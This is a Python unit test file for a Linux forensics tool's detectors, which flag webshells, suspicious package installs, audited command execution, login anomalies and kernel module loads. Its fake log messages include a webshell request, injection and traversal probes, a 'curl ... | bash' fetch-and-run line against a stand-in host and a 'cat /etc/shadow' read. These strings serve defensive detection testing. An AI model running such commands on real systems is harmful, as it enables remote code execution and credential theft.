"""Unit tests for step-7b detectors: webshell, package_install,
audit_exec, login_anomalies, kernel_module."""

from __future__ import annotations

from datetime import UTC, datetime

from linuxdfir.detectors import (
    audit_exec,
    kernel_module,
    login_anomalies,
    package_install,
    webshell,
)
from linuxdfir.schema import Event, Severity


def _event(**kw) -> Event:
    defaults = dict(
        timestamp_utc=None,
        host="test",
        user=None,
        source_artifact="test",
        event_type="test",
        message="",
        evidence_path="/test",
        line_or_offset=1,
    )
    defaults.update(kw)
    return Event(**defaults)


def _web(method, uri, status, ip, ua="Mozilla/5.0"):
    return _event(
        event_type="web_request",
        evidence_path="/var/log/nginx/access.log",
        message=f'web {method} {uri} -> {status} from {ip} ua="{ua}"',
    )


# --------------------------------------------------------------- webshell


class TestWebshell:
    def test_webshell_hit_high(self):
        events = [
            _web("GET", "/wp-content/uploads/shell.php?cmd=id", 200, "203.0.113.9"),
            _web("POST", "/wp-content/uploads/shell.php", 200, "203.0.113.9"),
        ]
        findings = webshell.detect(events)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "T1505.003" in findings[0].mitre_ids

    def test_single_probe_low(self):
        findings = webshell.detect([_web("GET", "/?x=' OR 1=1--", 404, "203.0.113.9")])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_repeated_probing_medium(self):
        events = [_web("GET", "/?x=../../etc/passwd", 404, "203.0.113.9") for _ in range(3)]
        findings = webshell.detect(events)
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM

    def test_scanner_ua_medium(self):
        findings = webshell.detect([_web("GET", "/index.html", 200, "203.0.113.9", ua="sqlmap/1.7")])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_post_new_script_medium(self):
        findings = webshell.detect([_web("POST", "/uploads/new.php", 200, "203.0.113.9")])
        mediums = [f for f in findings if f.severity == Severity.MEDIUM]
        assert mediums

    def test_benign_clean(self):
        events = [
            _web("GET", "/index.html", 200, "10.0.0.7", ua="curl/8.0"),
            _web("GET", "/about.html", 200, "10.0.0.7", ua="Mozilla/5.0"),
        ]
        assert webshell.detect(events) == []


# ---------------------------------------------------------- package_install


class TestPackageInstall:
    def test_netcat_medium(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/dpkg.log",
            message="package install netcat-traditional:amd64 1.10-41.1",
        )
        findings = package_install.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert "T1588.002" in findings[0].mitre_ids

    def test_libc6_clean(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/dpkg.log",
            message="package install libc6:amd64 2.36-9",
        )
        assert package_install.detect([e]) == []

    def test_remove_silent(self):
        e = _event(
            event_type="package_remove",
            evidence_path="/var/log/dpkg.log",
            message="package remove nmap:amd64 7.93",
        )
        assert package_install.detect([e]) == []


# -------------------------------------------------------------- audit_exec


class TestAuditExec:
    def test_curl_pipe_sh_high(self):
        e = _event(
            event_type="audit_exec",
            evidence_path="/var/log/audit/audit.log",
            message="audit exec pid=4152 auid=0: bash -c curl http://e.com/x | bash",
        )
        findings = audit_exec.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1059" in findings[0].mitre_ids

    def test_shadow_access_credential_mitre(self):
        e = _event(
            event_type="audit_exec",
            evidence_path="/var/log/audit/audit.log",
            message="audit exec pid=4152 auid=0: cat /etc/shadow",
        )
        findings = audit_exec.detect([e])
        assert findings and "T1003.008" in findings[0].mitre_ids

    def test_benign_silent(self):
        e = _event(
            event_type="audit_exec",
            evidence_path="/var/log/audit/audit.log",
            message="audit exec pid=100 auid=0: /usr/sbin/cron -f",
        )
        assert audit_exec.detect([e]) == []

    def test_priv_transition_medium(self):
        e = _event(
            event_type="audit_event",
            evidence_path="/var/log/audit/audit.log",
            message="audit event 70 [SYSCALL]: exe=/bin/su auid=1000 uid=0 success=yes",
        )
        findings = audit_exec.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_root_auid_silent(self):
        e = _event(
            event_type="audit_event",
            evidence_path="/var/log/audit/audit.log",
            message="audit event 45 [SYSCALL]: exe=/usr/bin/bash auid=0 uid=0 success=yes",
        )
        assert audit_exec.detect([e]) == []


# ---------------------------------------------------------- login_anomalies


def _login(user, ip, hour, path="/var/log/wtmp"):
    return _event(
        event_type="wtmp_login",
        evidence_path=path,
        message=f"login {user} from {ip} on pts/0 at 2026-01-02T{hour:02d}:12:44+02:00",
    )


def _failure(user, ip, stamp):
    return _event(
        event_type="btmp_failure",
        evidence_path="/var/log/btmp",
        timestamp_utc=stamp,
        message=f"failed login {user} from {ip} on ssh at 2026-01-02T03:10:07+02:00",
    )


class TestLoginAnomalies:
    def test_correlated_high(self):
        stamp = datetime(2026, 1, 2, 1, 10, 7, tzinfo=UTC)
        events = [_login("root", "203.0.113.9", 3), _failure("root", "203.0.113.9", stamp)]
        findings = login_anomalies.detect(events)
        highs = [f for f in findings if f.severity == Severity.HIGH]
        assert len(highs) == 1
        assert "T1078" in highs[0].mitre_ids

    def test_night_login_low(self):
        findings = login_anomalies.detect([_login("admin", "10.0.0.7", 3)])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_day_login_clean(self):
        assert login_anomalies.detect([_login("admin", "10.0.0.7", 9)]) == []

    def test_btmp_spike_medium(self):
        base = datetime(2026, 1, 2, 1, 10, 7, tzinfo=UTC)
        events = [
            _failure("root", "203.0.113.9", base.replace(second=(base.second + i * 20) % 60))
            for i in range(20)
        ]
        findings = login_anomalies.detect(events)
        assert any(f.severity == Severity.MEDIUM and "spike" in f.title for f in findings)

    def test_root_direct_low(self):
        findings = login_anomalies.detect([_login("root", "10.0.0.7", 9)])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_root_correlated_suppresses_direct(self):
        stamp = datetime(2026, 1, 2, 1, 10, 7, tzinfo=UTC)
        events = [_login("root", "203.0.113.9", 9), _failure("root", "203.0.113.9", stamp)]
        findings = login_anomalies.detect(events)
        assert not [f for f in findings if "Direct root login" in f.title]


# ------------------------------------------------------------ kernel_module


class TestKernelModule:
    def test_out_of_tree_medium(self):
        e = _event(
            event_type="kernel_module",
            evidence_path="/var/log/kern.log",
            message="kernel module hid_x: loading out-of-tree module taints kernel.",
        )
        findings = kernel_module.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert "T1547.006" in findings[0].mitre_ids

    def test_plain_load_silent(self):
        e = _event(
            event_type="kernel_module",
            evidence_path="/var/log/kern.log",
            message="kernel module tls: loaded during boot",
        )
        assert kernel_module.detect([e]) == []
